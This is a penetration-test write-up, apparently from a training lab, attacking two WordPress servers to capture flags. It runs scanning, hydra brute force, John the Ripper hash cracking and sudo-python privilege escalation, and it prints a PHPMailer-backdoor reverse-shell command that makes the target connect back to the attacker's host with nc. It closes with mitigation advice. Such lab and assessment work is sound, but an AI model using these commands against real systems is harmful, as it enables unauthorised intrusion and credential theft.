# Raven Security Engagement #
### Offensive Engagement and Assessment of Web Servers ###
#### Author: Exton Howard ####
#### August 5, 2021 ####

## High Level Summary ##

The team was tasked with performing network scans, finding any vulnerabilities that are present and exploitable on Raven Security's Wordpress Web Servers, and then exploiting the vulnerabilities to find the files (flags) that are located on the machines.

## Network Topology ##

| IP | Machine |
| :---: | :---: |
| 192.168.1.1 | Hyper-V |
| 192.168.1.90 | Kali |
| 192.168.1.100 | Elastic Stack (ELK) |
| 192.168.1.110 | Target 1 |
| 192.168.1.115 | Target 2 |

![alt text](/Network_Topology.png "Network Topology")

## Target 1 Engagement ##

Scanned target computer using nmap

```
nmap -sV -O 192.168.1.110
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_nmap.JPG "nmap results")

Determined this machine is a web server with a variety of ports open

| Port | Service | Version |
| :---: | :---: | :---: |
| 22 | ssh | OpenSSH 6.7p1 Debian 5+deb8u4 |
| 80 | http | Apache httpd 2.4.10 ((Debian)) |
| 111 | rpcbind | 2-4 (RPC #10000) |
| 139 | netbios-ssn | Netbios Samba 3.x-4.x |
| 445 | netbios-ssn | Netbios Samba 3.x-4.x |

First thing that caught my eye is that a web server is up and running. Opened a browser and navigated to 192.168.1.110. Found a web server with an active page running wordpress. While navigating around the web page, discovered an exposed flag under the footer of the service tab

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_flag1_clean.JPG "Flag 1")

Decided to use wpscan to enumerate users and check for vulnerabilities on the wordpress server

```
wpscan --url http://192.168.1.110/wprdpress --enumerate u
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_wpscan_brute_force.JPG "Users with Brute Force Vulnerabilities")

Discovered 2 users, michael and steven, with potential brute force vulnerabilities. Decided to start with michael. Attempted to SSH into Target 1 and guess the password amongst a few really simple options. Did not successfully guess within the first 6 tries. Started Hydra with a wordlist to determine login credentials

```
hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 -t 4 ssh
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_hydra.JPG "Hydra")

Discovered michaels password and logged in via ssh. Found a regular user account with no sudo privileges. Looked around to see what else was in this account. Searched for flags & located flag 2 in the /var/www dir

```
locate flag
cat /var/www/flag2.txt
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_flag2_clean.JPG "Flag 2")

Inspected the /var/www/html/ directory and found MySQL database credentials in the wp-config.php file.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_mysql_creds.JPG "Credentials")

Used mySQL command line tool to inspect the database to see if there was anything interesting, such as a users table that could potentially show passwords. Discovered a table called wp_users that would be the first place to start

```
mysql -u root -pPASSWORD_REDACTED -D wordpress -e "show tables;"
mysql -u root -pPASSWORD_REDACTED -D wordpress -e "select * from wp_users;"
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_users_table.JPG "Users table")

Found hashed credentials in the Users table. Decided to search the remainder of the database to see if there was anything else interesting. Located both Flag 3 and Flag 4 in the wp_posts table

```
mysql -u root -pPASSWORD_REDACTED -D wordpress -e "select * from wp_users;"
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_Flag3_Flag4.JPG "Flag 3 & Flag 4")

Discovered usernames and password hashes in the wp_users table. Since michael's password was previously determined, only copied steven's credentials to the Kali machine. Fired up John the Ripper to get to work on breaking steven's credentials

```
john hashes.text --wordlist=/usr/share/wordlists/rockyou.txt
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_john.JPG "John The Ripper")

Once steven's credentials were cracked, the team used ssh to log in with steven's account. Checked and discovered that steven has sudo privileges without a password for python. The team executed a python command line script that would allow spawning of a privileged shell

```
sudo -l
sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_escalation.JPG "Privilege Escalation to Root")

The team now has root access to the machine. Navigated to `/root` directory and read out the final flag of flag 4

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T1_flag4_root.JPG  "Flag 4 as Root")


## Target 2 Engagement ##

Scanned target using nmap

```
nmap -sV -O 192.168.1.115
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_nmap.JPG "nmap results")

Target 2 looks identical to Target 1. Target 2 has the multiple ports open with services running

| Port | Service Version |
| :---: | :---: |
| 22 | OpenSSH 6.7p1 Debian |
| 80 | Apache httpd 2.4.10 |
| 111 | rpcbind 2-4 |
| 139 | Netbios Samba 3.x-4.x |
| 445 | Netbios Samba 3.x-4.x |

Used nikto for further enumeration of the site

```
nikto -C all -h 192.168.1.115
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_nikto.JPG "nikto results")

nikto shows multiple hidden subdomains. After inspecting the subdomains, decided to use gobuster for further enumeration

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_gobuster.JPG "gobuster results")

gobuster revealed more subdomains. The vendor subdomain is intriguing, so shall start with that. Inspected `http://192.168.1.115/vendor` and found a list of files and directories.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_vendor_dir.JPG "vendor directory")

Started looking through the directory. Found interesting items in the sub directories, and noticed PATH had the newest timestamp. Found Flag 1 inside the PATH file

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_flag1_CLEAN.JPG "Flag 1")

Searched around more & discovered a file referring to specific security vulnerabilities to this version of PHPMailer. Confirmed version of PHPMailer is vulnerable to a RCE exploit listed using searchsploit. The team found and modified an exploit to the vulnerability

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2-exploit.JPG "Bash Exploit Script")

Ran the exploit. Tested operation of the exploit, then set up a listener on the Kali and used the exploit to have Target 2 call my Kali. Exported a proper shell using python

```
bash exploit.sh
nc -vnlp 1234
192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 1234 -e /bin/bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=linux
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_reverse_shell.JPG "Exploit Reverse Shell Command")

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_shell.JPG "Getting the Shell!")

Took stock of what we had. Found Flag 2 in the /var/www directory

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_flag2_CLEAN.JPG "Flag 2")

And found the location of Flag 3. Had to return to the web browser to read it out

```
192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_flag3_CLEAN.jpg "Flag 3")

Found 3 of the 4 target flags. Having found no sign of the 4th flag, the focus now turned to privilege escalation. Attempted to just switch to the root account. Was prompted for a password and unbeliveably was able to guess the exact password. The root password was as easy, if not easier, than guessing user michael's password from Target 1.

```
su root
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_su_root_clean.jpg "Switch to Root")

And with that, it was easy to capture Flag 4.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/T2_flag4_CLEAN.jpg "Flag 4")


After guessing the root user password, went to check Target 1 & found the root user on Target 1 had the same password.

## Vulnerabilities and Mitigation ##
Several vulnerabilities were discovered during the completion of this engagement. Target 1 has numerous critical vulnerabilities that should be addressed immediately

### Ports Exposed to the Internet ###
The team discovered that multiple ports on Target 1 and Target 2 that should not have been exposed were exposed to the internet.

Mitigation
* Minimize ports exposed to the internet
* Set strict alarms to alert your SOC on any ports exposed to the internet
* Set an alarm to notify the SOC if more than 25 ports aside from 80 and 443 are scanned in under 5 minutes
* Apply a firewall rule to default-deny all non-whitelisted IP addresses to accessing ports other than port 80 or 443
* If ports other than 80 or 443 must be exposed, enable TCP wrapping and firewall rules that auto-deny any IP that is not specifically whitelisted
* Apply firewall rules to deny ICMP requests and not send responses

### Sensitive Data Exposure ###
During the engagement, the team found Target 1 has a flag exposed on the Wordpress website in the page source code for the service page. This was easily discoverable. Target 2 also had a flag exposed as well as list of vulnerabilities on that exact version of PHPMailer

Mitigation
* Remove flag from the source code
* Remove any file or directory that should not be accessed by the public

### Security Misconfiguration: Brute Force Vulnerability ###
The team found the users of the Target 1 web server did not have account lockouts active for excessive failed lockout attempts.

Mitigation
* Set an alarm to notify the SOC if more than 10 HTTP 401 response codes are on the same account in under 10 minutes
* Set a user policy that locks out the account for 30 minutes after 10 failed login attempts
* Enable 2-factor authentication on all accounts
* Enable a random 1-3 second delay on password validation to slow down any brute force attacks
* If more than 20 failed login attempts from the same IP address occurs sitewide within 10 minutes, blacklist that IP until it can be reviewed

### Outdated Software Version ###
The team discovered an older version of Wordpress on Target 1 with many known vulnerabilities. The team also discovered an exploitable version of PHPMailer on Target 2

Mitigation
* Update Wordpress to the latest version (as of the time of this report, that is version 5.7.1)
* Update PHPMailer to the latest version (as of the time of this report, that is version 6.3.0)

### Unsalted Hashed Passwords ###
The team obtained a password hash during the engagement. An open source tool was able to quickly break the hash and allowed the team to gain login credentials for a privileged account on Target 1. Target 2's password hashes were salted

Mitigation
* Restrict files with password hashes to admin level accounts
* Do not have any files that contain password hashes exposed to the internet
* Salt all password hashes

### Weak Passwords ###
The team found that the passwords on Target 1 that they were able to Brute Force and the hashed passwords that they were able to crack were short and not complex.

Mitigation
* Require all passwords to contain a minimum of 10 characters
* Require all passwords to contain at minimum 1 capital letter
* Require all passwords to contain at minimum 1 special character (!, %, *, etc)
* Require all passwords not be commonly used words, employees names, company names, or in the dictionary

### MySQL Running as Root ###
Found MySQL database on both Target 1 & Target 2 running with root credentials. This is not necessary as MySQL can be run as any user

Mitigation
* Remove Root credentials from the wp-config.php file
* Create a different user to be the default user to the MySQL database

### Root Password easily guessed ###
Target 1 and Target 2 had an unbelieveably easy password on the root account allowing it to be guessed. Both web servers used the same, easily guessed password for root account.

Mitigation
* Change the root password to a long and complex password

## Conclusion ##

Target 1 had many substantial vulnerabilities. The quickest methods to increase the security of Target 1 is to update to the latest version of Wordpress, close extra ports, and apply account lockouts. Target 2 was better protected but still allowed a backdoor and an easily guessed root user password. Change the password on the root account and update Wordpress to the latest version. Also, on both Target 1 & 2, create & use a non-privileged account for the MySQL database.